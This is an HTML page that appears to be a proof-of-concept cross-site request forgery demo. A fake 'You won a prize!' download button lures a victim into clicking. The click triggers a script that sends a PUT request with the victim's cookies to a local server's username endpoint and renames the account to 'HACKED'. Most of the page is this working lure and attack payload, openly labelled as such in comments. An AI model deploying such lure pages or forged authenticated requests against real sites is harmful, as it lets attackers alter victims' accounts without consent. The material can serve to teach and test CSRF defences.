<!DOCTYPE html>

<head>

<body>

    <div class="download-card">
        <h1>üéâ You won a prize!</h1>
        <p>Click the button below to claim your free download.</p>
        
        <!-- The Trap -->
        <button id="maliciousBtn" class="btn">‚¨áÔ∏è Download Prize</button>
        
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('maliciousBtn').addEventListener('click', async () => {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = "Processing download...";

            try {
                // üö® THE ATTACK PAYLOAD
                // We send a PUT request to the vulnerable local server.
                // 'credentials: include' forces the browser to send the victim's cookies.
                const response = await fetch('http://localhost:3000/api/auth/username-cookie', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        username: 'HACKED' 
                    }),
                    credentials: 'include' // <--- This is the key! Sends auth cookies.
                });

                const data = await response.json();
                
                if (response.ok) {
                    statusDiv.innerHTML = '<span style="color:red; font-weight:bold;">Attack Successful! Username changed to "HACKED"</span>';
                    console.log('CSRF Attack Successful:', data);
                } else {
                    statusDiv.textContent = 'Attack failed: ' + (data.error || response.statusText);
                }
            } catch (error) {
                statusDiv.textContent = 'Connection error (Is the server running?)';
                console.error(error);
            }
        });
    </script>
